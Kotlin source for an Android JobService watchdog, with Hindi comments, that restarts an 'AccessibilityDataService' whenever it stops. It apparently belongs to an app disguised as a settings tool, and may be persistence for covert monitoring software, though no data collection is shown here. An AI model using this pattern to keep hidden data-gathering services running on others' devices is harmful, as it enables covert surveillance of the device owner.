package com.safe.setting.app.services.watchdog

import android.app.job.JobParameters
import android.app.job.JobService
import android.content.Intent
import android.os.Build
import android.util.Log
import com.safe.setting.app.services.accessibilityData.AccessibilityDataService
import com.safe.setting.app.utils.Consts.TAG

class WatchdogJobService : JobService() {

    override fun onStartJob(params: JobParameters?): Boolean {
        Log.d(TAG, "WatchdogJobService started.")

        // जांचें कि क्या हमारी मुख्य सर्विस चल रही है
        if (!AccessibilityDataService.isRunningService) {
            Log.e(TAG, "JobService Watchdog detected service is down. Restarting...")
            val serviceIntent = Intent(this, AccessibilityDataService::class.java)

            // सर्विस को फिर से शुरू करें
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
        } else {
            Log.d(TAG, "JobService Watchdog checked: Service is already running.")
        }

        // काम पूरा हो गया
        jobFinished(params, false)
        return true
    }

    override fun onStopJob(params: JobParameters?): Boolean {
        Log.d(TAG, "WatchdogJobService stopped.")
        // यदि काम पूरा होने से पहले रोका जाता है तो फिर से शेड्यूल करें
        return true
    }
}